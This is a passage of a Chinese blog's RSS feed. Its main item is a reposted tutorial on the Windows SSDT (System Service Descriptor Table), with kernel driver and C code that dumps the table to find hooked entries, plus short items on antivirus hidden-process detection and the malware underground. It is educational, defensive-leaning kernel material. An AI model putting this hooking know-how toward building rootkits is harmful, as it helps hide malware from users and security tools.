+0800</pubDate><guid>https://blogs.qipai360.cn/post/avp-active-defense-hidden-process/</guid><description>&lt;p&gt;卡巴主动防御中检测隐藏进程的方法：&lt;br /&gt;&lt;/p&gt;
&lt;p&gt;    Hook掉系统的SwapContext,这种方法是在2003年被提出的;这个函数被KiSwapThread调用,负责线程调度;下面这部分代码就是卡巴Detour SwapContext的汇编代码的分析(后面附上对应的c代码)：&lt;br /&gt;&lt;/p&gt;</description></item><item><title>中国黑客自揭黑色产业链条：做病毒一定要低调</title><link>https://blogs.qipai360.cn/post/chinese-hacker-black-industry/</link><pubDate>Thu, 15 Nov 2007 09:36:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/chinese-hacker-black-industry/</guid><description>&lt;p&gt;“熊猫烧香”余波未了，“灰鸽子”又飞进了人们的视野。&lt;/p&gt;
&lt;p&gt;　　在这个领域，互联网“险情”不断。&lt;/p&gt;
&lt;p&gt;　　——网络世界，这个表面看起来风平浪静的生态，背后无时不在发生着弱肉强食的事件，就像森林里生物链一样默默发生着变化，而外边望去却一片平静。&lt;/p&gt;</description></item><item><title>城里城外看SSDT[转]</title><link>https://blogs.qipai360.cn/post/viewing-ssdt-inside-out/</link><pubDate>Wed, 07 Nov 2007 10:57:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/viewing-ssdt-inside-out/</guid><description>&lt;p&gt;&lt;a href="http://www.titilima.cn/sample/ssdtdump.zip"&gt;点这里下载本文的配套代码&lt;/a&gt; &lt;p&gt;&lt;b&gt;引子&lt;/b&gt; &lt;p&gt;2006年，中国互联网上的斗争硝烟弥漫。这时的战场上，先前颇为流行的窗口挂钩、API挂钩、进程注入等技术已然成为昨日黄花，大有逐渐淡出之势；取而代之的，则是更狠毒、更为赤裸裸的词汇：驱动、隐藏进程、Rootkit…… &lt;p&gt;前不久，我不经意翻出自己2005年9月写下的一篇文章&lt;a href="http://www.titilima.cn/readarticle.php?id=65"&gt;《DLL的远程注入技术》&lt;/a&gt;，在下面看到了一位名叫L4bm0s的网友说这种技术已经过时了。虽然我也曾想过拟出若干辩解之词聊作应对，不过最终还是作罢了——毕竟，拿出些新的、有技术含量的东西才是王道。于是这一次，李马首度从ring3（应用层）的围城跨出，一跃而投身于ring0（内核层）这一更广阔的天地，便有了这篇《城里城外看SSDT》。——顾名思义，城里和城外的这一墙之隔，就是ring3与ring0的分界。 &lt;p&gt;在这篇文章里，我会用到太多杂七杂八的东西，比如汇编，比如内核调试器，比如DDK。这诚然是一件令我瞻前顾后畏首畏尾的事情——一方面在ring0我不得不依靠这些东西，另一方面我实在担心它们会导致我这篇文章的阅读门槛过高。所以，我决定尽可能少地涉及驱动、内核与DDK，也不会对诸如如何使用内核调试器等问题作任何讲解——你只需要知道我大概在做些什么，这就足够了。 &lt;p&gt;&lt;b&gt;什么是SSDT？&lt;/b&gt; &lt;p&gt;什么是SSDT？自然，这个是我必须回答的问题。不过在此之前，请你打开命令行（cmd.exe）窗口，并输入“dir”并回车——好了，列出了当前目录下的所有文件和子目录。 &lt;p&gt;那么，以程序员的视角来看，整个过程应该是这样的： &lt;ol&gt; &lt;li&gt;由用户输入dir命令。 &lt;li&gt;cmd.exe获取用户输入的dir命令，在内部调用对应的Win32 API函数FindFirstFile、FindNextFile和FindClose，获取当前目录下的文件和子目录。 &lt;li&gt;cmd.exe将文件名和子目录输出至控制台窗口，也就是返回给用户。 &lt;/li&gt;&lt;/ol&gt; &lt;p&gt;到此为止我们可以看到，cmd.exe扮演了一个非常至关重要的角色，也就是用户与Win32 API的交互。——你大概已经可以猜到，我下面要说到的SSDT亦必将扮演这个角色，这实在是一点新意都没有。 &lt;p&gt;没错，你猜对了。SSDT的全称是System Services Descriptor Table，系统服务描述符表。这个表就是一个把ring3的Win32 API和ring0的内核API联系起来的角色，下面我将以API函数OpenProcess为例说明这个联系的过程。 &lt;p&gt;你可以用任何反汇编工具来打开你的kernel32.dll，然后你会发现在OpenProcess中有类似这样的汇编代码： &lt;p&gt;&lt;code&gt;call ds:NtOpenProcess&lt;/code&gt; &lt;p&gt;这就是说，OpenProcess调用了ntdll.dll的NtOpenProcess函数。那么继续反汇编之，你会发现ntdll.dll中的这个函数很短： &lt;p&gt;&lt;code&gt;mov eax, 7Ah&lt;br&gt;mov edx, 7FFE0300h&lt;br&gt;call dword ptr [edx]&lt;br&gt;retn 10h&lt;/code&gt; &lt;p&gt;另外，call的一句实质是调用了KiFastSystemCall： &lt;p&gt;&lt;code&gt;mov edx, esp&lt;br&gt;sysenter&lt;/code&gt; &lt;p&gt;上面是我的XP Professional sp2中ntdll.dll的反汇编结果，如果你用的是2000系统，那么可能是这个样子： &lt;p&gt;&lt;code&gt;mov eax, 6Ah&lt;br&gt;lea edx, [esp+4]&lt;br&gt;int 2Eh&lt;br&gt;retn 10h&lt;/code&gt; &lt;p&gt;虽然它们存在着些许不同，但都可以这么来概括： &lt;ol&gt; &lt;li&gt;把一个数放入eax（XP是0x7A，2000是0x6A），这个数值称作系统的服务号。 &lt;li&gt;把参数堆栈指针（esp+4）放入edx。 &lt;li&gt;sysenter或int 2Eh。 &lt;/li&gt;&lt;/ol&gt; &lt;p&gt;好了，你在ring3能看到的东西就到此为止了。事实上，在ntdll.dll中的这些函数可以称作真正的NT系统服务的存根（Stub）函数。分隔ring3与ring0城里城外的这一道叹息之墙，也正是由它们打通的。接下来SSDT就要出场了，come some music。 &lt;p&gt;&lt;b&gt;站在城墙看城外&lt;/b&gt; &lt;p&gt;插一句先，貌似到现在为止我仍然没有讲出来SSDT是个什么东西，真正可以算是“犹抱琵琶半遮面”了。——书接上文，在你调用sysenter或int 2Eh之后，Windows系统将会捕获你的这个调用，然后进入ring0层，并调用内核服务函数NtOpenProcess，这个过程如下图所示。 &lt;p&gt;&lt;img src="http://www.titilima.cn/pics/ssdtdump1.gif"&gt; &lt;p&gt;SSDT在这个过程中所扮演的角色是至关重要的。让我们先看一看它的结构，如下图。 &lt;p&gt;&lt;img src="http://www.titilima.cn/pics/ssdtdump2.gif"&gt; &lt;p&gt;当程序的处理流程进入ring0之后，系统会根据服务号（eax）在SSDT这个系统服务描述符表中查找对应的表项，这个找到的表项就是系统服务函数NtOpenProcess的真正地址。之后，系统会根据这个地址调用相应的系统服务函数，并把结果返回给ntdll.dll中的NtOpenProcess。图中的“SSDT”所示即为系统服务描述符表的各个表项；右侧的“ntoskrnl.exe”则为Windows系统内核服务进程（ntoskrnl即为NT OS KerneL的缩写），它提供了相对应的各个系统服务函数。ntoskrnl.exe这个文件位于Windows的system32目录下，有兴趣的朋友可以反汇编一下。 &lt;p&gt;附带说两点。根据你处理器的不同，系统内核服务进程可能也是不一样的。真正运行于系统上的内核服务进程可能还有ntkrnlmp.exe、ntkrnlpa.exe这样的情况——不过为了统一起见，下文仍统称这个进程为ntoskrnl.exe。另外，SSDT中的各个表项也未必会全部指向ntoskrnl.exe中的服务函数，因为你机器上的杀毒监控或其它驱动程序可能会改写SSDT中的某些表项——这也就是所谓的“挂钩SSDT”——以达到它们的“主动防御”式杀毒方式或其它的特定目的。 &lt;p&gt;&lt;b&gt;KeServiceDescriptorTable&lt;/b&gt; &lt;p&gt;事实上，SSDT并不仅仅只包含一个庞大的地址索引表，它还包含着一些其它有用的信息，诸如地址索引的基地址、服务函数个数等等。ntoskrnl.exe中的一个导出项KeServiceDescriptorTable即是SSDT的真身，亦即它在内核中的数据实体。SSDT的数据结构定义如下： &lt;p&gt;&lt;code&gt;typedef struct _tagSSDT {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PVOID pvSSDTBase;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PVOID pvServiceCounterTable;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ULONG ulNumberOfServices;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PVOID pvParamTableBase;&lt;br&gt;} SSDT, *PSSDT;&lt;/code&gt; &lt;p&gt;其中，pvSSDTBase就是上面所说的“系统服务描述符表”的基地址。pvServiceCounterTable则指向另一个索引表，该表包含了每个服务表项被调用的次数；不过这个值只在Checkd Build的内核中有效，在Free Build的内核中，这个值总为NULL（注：Check/Free是DDK的Build模式，如果你只使用SDK，可以简单地把它们理解为Debug/Release）。ulNumberOfServices表示当前系统所支持的服务个数。pvParamTableBase指向SSPT（System Service Parameter Table，即系统服务参数表），该表格包含了每个服务所需的参数字节数。 &lt;p&gt;下面，让我们开看看这个结构里边到底有什么。打开内核调试器（以kd为例），输入命令显示KeServiceDescriptorTable，如下。 &lt;p&gt;&lt;code&gt;lkd&amp;gt; dd KeServiceDescriptorTable l4&lt;br&gt;8055ab80 804e3d20 00000000 0000011c 804d9f48&lt;/code&gt; &lt;p&gt;接下来，亦可根据基地址与服务总数来查看整个服务表的各项： &lt;p&gt;&lt;code&gt;lkd&amp;gt; dd 804e3d20 l11c&lt;br&gt;804e3d20 80587691 f84317aa f84317b4 f84317be&lt;br&gt;804e3d30 f84317c8 f84317d2 f84317dc f84317e6&lt;br&gt;804e3d40 8057741c f84317fa f8431804 f843180e&lt;br&gt;804e3d50 f8431818 f8431822 f843182c f8431836&lt;br&gt;...&lt;/code&gt; &lt;p&gt;你获得的结果可能和我会有不同——我指的是那堆以十六进制f开头的地址项，因为我的SSDT被&lt;a href="http://www.syssafety.com"&gt;System Safety Monitor&lt;/a&gt;接管了，没留下几个原生的ntoskrnl.exe表项。 &lt;p&gt;现在是写些代码的时候了。KeServiceDescriptorTable及SSDT各个表项的读取只能在ring0层完成，于是这里我使用了内核驱动并借助DeviceIoControl来完成。其中DeviceIoControl的分发代码实现如下面的代码所示，没有什么技术含量，所以不再解释。 &lt;p&gt;&lt;code&gt;switch ( IoControlCode ) &lt;br&gt;{&lt;br&gt;case IOCTL_GETSSDT:&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;__try&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ProbeForWrite( OutputBuffer, sizeof( SSDT ), sizeof( ULONG ) );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; RtlCopyMemory( OutputBuffer, KeServiceDescriptorTable, sizeof( SSDT ) );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;__except ( EXCEPTION_EXECUTE_HANDLER )&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; IoStatus-&amp;gt;Status = GetExceptionCode();&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;break;&lt;br&gt;case IOCTL_GETPROC:&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ULONG uIndex = 0;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; PULONG pBase = NULL;&lt;br&gt;__try&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ProbeForRead( InputBuffer, sizeof( ULONG ), sizeof( ULONG ) );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ProbeForWrite( OutputBuffer, sizeof( ULONG ), sizeof( ULONG ) );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;__except( EXCEPTION_EXECUTE_HANDLER )&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; IoStatus-&amp;gt;Status = GetExceptionCode();&lt;br&gt;break;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; uIndex = *(PULONG)InputBuffer;&lt;br&gt;if ( KeServiceDescriptorTable-&amp;gt;ulNumberOfServices &amp;lt;= uIndex )&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; IoStatus-&amp;gt;Status = STATUS_INVALID_PARAMETER;&lt;br&gt;break;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; pBase = KeServiceDescriptorTable-&amp;gt;pvSSDTBase;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; *((PULONG)OutputBuffer) = *( pBase + uIndex );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;break;&lt;br&gt;// ...&lt;br&gt;}&lt;/code&gt; &lt;p&gt;补充一下，再。DDK的头文件中有一件很遗憾的事情，那就是其中并未声明KeServiceDescriptorTable，不过我们可以自己手动添加之： &lt;p&gt;&lt;code&gt;extern PSSDT KeServiceDescriptorTable;&lt;/code&gt; &lt;p&gt;——当然，如果你对DDK开发实在不感兴趣的话，亦可以直接使用配套代码压缩包中的SSDTDump.sys，并使用DeviceIoControl发送IOCTL_GETSSDT和IOCTL_GETPROC控制码即可；或者，直接调用我为你准备好的两个函数： &lt;p&gt;&lt;code&gt;BOOL GetSSDT( IN HANDLE hDriver, OUT PSSDT buf );&lt;br&gt;BOOL GetProc( IN HANDLE hDriver, IN ULONG ulIndex, OUT PULONG buf );&lt;/code&gt; &lt;p&gt;&lt;b&gt;获取详细模块信息&lt;/b&gt; &lt;p&gt;虽然我们现在可以获取任意一个服务号所对应的函数地址了已经，但是你可能仍然不满意，认为只有获得了这个服务函数所在的模块才是王道。换句话说，对于一个干净的SSDT表来说，它里边的表项应该都是指向ntoskrnl.exe的；如果SSDT之中有若干个表项被改写（挂钩），那么我们应该知道是哪一个或哪一些模块替换了这些服务。 &lt;p&gt;首先我们需要获得当前在ring0层加载了那些模块。如我在本文开头所说，为了尽可能地少涉及ring0层的东西，于是在这里我使用了ntdll.dll的NtQuerySystemInformation函数。关键代码如下： &lt;p&gt;&lt;code&gt;typedef struct _SYSTEM_MODULE_INFORMATION { &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ULONG Reserved[2]; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PVOID Base; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ULONG Size; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ULONG Flags; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; USHORT Index; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; USHORT Unknown; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; USHORT LoadCount; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; USHORT ModuleNameOffset; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; CHAR ImageName[256]; &lt;br&gt;} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION; &lt;br&gt;typedef struct _tagSysModuleList {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ULONG ulCount;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; SYSTEM_MODULE_INFORMATION smi[1];&lt;br&gt;} SYSMODULELIST, *PSYSMODULELIST;&lt;br&gt;s = NtQuerySystemInformation( SystemModuleInformation, pRet,&lt;br&gt;sizeof( SYSMODULELIST ), &amp;amp;nRetSize );&lt;br&gt;if ( STATUS_INFO_LENGTH_MISMATCH == s )&lt;br&gt;{&lt;br&gt;// 缓冲区太小，重新分配&lt;br&gt;delete pRet;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pRet = (PSYSMODULELIST)new BYTE[nRetSize];&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; s = NtQuerySystemInformation( SystemModuleInformation, pRet,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nRetSize, &amp;amp;nRetSize ); &lt;br&gt;}&lt;/code&gt; &lt;p&gt;需要说明的是，这个函数是利用内核的PsLoadedModuleList链表来枚举系统模块的，因此如果你遇到了能够隐藏驱动的Rootkit，那么这种方法是无法找到被隐藏的模块的。在这种情况下，枚举系统的“\Driver”目录对象可能可以更好解决这个问题，在此不再赘述了就。 &lt;p&gt;接下来，是根据SSDT中的地址表项查找模块。有了SYSTEM_MODULE_INFORMATION结构中的模块基地址与模块大小，这个工作完成起来也很容易： &lt;p&gt;&lt;code&gt;BOOL FindModuleByAddr( IN ULONG ulAddr, IN PSYSMODULELIST pList,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; OUT LPSTR buf, IN DWORD dwSize )&lt;br&gt;{&lt;br&gt;for ( ULONG i = 0; i &amp;lt; pList-&amp;gt;ulCount; ++i )&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ULONG ulBase = (ULONG)pList-&amp;gt;smi[i].Base;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ULONG ulMax&amp;nbsp; = ulBase + pList-&amp;gt;smi[i].Size;&lt;br&gt;if ( ulBase &amp;lt;= ulAddr &amp;amp;&amp;amp; ulAddr &amp;lt; ulMax )&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;// 对于路径信息，截取之&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; PCSTR pszModule = strrchr( pList-&amp;gt;smi[i].ImageName, '\\' );&lt;br&gt;if ( NULL != pszModule )&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; lstrcpynA( buf, pszModule + 1, dwSize );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;else&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; lstrcpynA( buf, pList-&amp;gt;smi[i].ImageName, dwSize );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;return TRUE;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;return FALSE;&lt;br&gt;}&lt;/code&gt; &lt;p&gt;&lt;b&gt;详细枚举系统服务项&lt;/b&gt; &lt;p&gt;到现在为止，还遗留有一个问题，就是获得服务号对应的服务函数名。比如XP下0x7A对应着NtOpenProcess，但是到2000下，NtOpenProcess就改为0x6A了。 &lt;p&gt;——有一个好消息一个坏消息，你先听哪个？ &lt;p&gt;——什么坏消息？ &lt;p&gt;——Windows并没有给我们开放这样现成的函数，所有的工作都需要我们自己来做。 &lt;p&gt;——那好消息呢？ &lt;p&gt;——牛粪有的是。 &lt;p&gt;坏了，串词儿了。好消息是我们可以通过枚举ntdll.dll的导出函数来间接枚举SSDT所有表项所对应的函数，因为所有的内核服务函数对应于ntdll.dll的同名函数都是这样开头的： &lt;p&gt;&lt;code&gt;mov eax, &amp;lt;ServiceIndex&amp;gt;&lt;/code&gt; &lt;p&gt;对应的机器码为： &lt;p&gt;&lt;code&gt;B8 &amp;lt;ServiceIndex&amp;gt;&lt;/code&gt; &lt;p&gt;再说一遍：非常幸运，仅就我手头上的2000 sp4、XP、XP sp1、XP sp2、2003的ntdll.dll而言，无一例外。不过Mark Russinovich的《深入解析Windows操作系统》一书中指出，IA64的调用方式与此不同——由于手头上没有相应的文件，所以在这里不进行讨论了就。 &lt;p&gt;接着说。我们可以把mov的一句用如下的一个结构来表示： &lt;p&gt;&lt;code&gt;#pragma pack( push, 1 )&lt;br&gt;typedef struct _tagSSDTEntry {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; BYTE&amp;nbsp; byMov;&amp;nbsp;&amp;nbsp; // 0xb8&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DWORD dwIndex;&lt;br&gt;} SSDTENTRY;&lt;br&gt;#pragma pack( pop )&lt;/code&gt; &lt;p&gt;那么，我们可以对ntdll.dll的所有导出函数进行枚举，并筛选出“Nt”开头者，以SSDTENTRY的结构取出其开头5个字节进行比对——这就是整个的枚举过程。相关的PE文件格式解析我不再解释，可参考注释。整个代码如下： &lt;p&gt;&lt;code&gt;#define MOV&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 0xb8&lt;br&gt;void EnumSSDT( IN HANDLE hDriver, IN HMODULE hNtDll )&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DWORD dwOffset&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; = (DWORD)hNtDll;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PIMAGE_EXPORT_DIRECTORY pExpDir = NULL;&lt;br&gt;int nNameCnt&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; = 0;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; LPDWORD pNameArray&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; = NULL;&lt;br&gt;int i&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; = 0;&lt;br&gt;// 到PE头部&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; dwOffset += ((PIMAGE_DOS_HEADER)hNtDll)-&amp;gt;e_lfanew + sizeof( DWORD );&lt;br&gt;// 到第一个数据目录&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; dwOffset += sizeof( IMAGE_FILE_HEADER ) + sizeof( IMAGE_OPTIONAL_HEADER )&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; - IMAGE_NUMBEROF_DIRECTORY_ENTRIES * sizeof( IMAGE_DATA_DIRECTORY );&lt;br&gt;// 到导出表位置&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; dwOffset = (DWORD)hNtDll&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; + ((PIMAGE_DATA_DIRECTORY)dwOffset)-&amp;gt;VirtualAddress;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pExpDir = (PIMAGE_EXPORT_DIRECTORY)dwOffset;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; nNameCnt = pExpDir-&amp;gt;NumberOfNames;&lt;br&gt;// 到函数名RVA数组&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pNameArray = (LPDWORD)( (DWORD)hNtDll + pExpDir-&amp;gt;AddressOfNames );&lt;br&gt;// 初始化系统模块链表&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PSYSMODULELIST pList = CreateModuleList( hNtDll );&lt;br&gt;// 循环查找函数名&lt;br&gt;for ( i = 0; i &amp;lt; nNameCnt; ++i )&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; PCSTR pszName = (PCSTR)( pNameArray[i] + (DWORD)hNtDll );&lt;br&gt;if ( 'N' == pszName[0] &amp;amp;&amp;amp; 't' == pszName[1] )&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;// 找到了函数，则定位至查找表&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; LPWORD pOrdNameArray = (LPWORD)( (DWORD)hNtDll + pExpDir-&amp;gt;AddressOfNameOrdinals );&lt;br&gt;// 定位至总表&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; LPDWORD pFuncArray&amp;nbsp;&amp;nbsp; = (LPDWORD)( (DWORD)hNtDll + pExpDir-&amp;gt;AddressOfFunctions 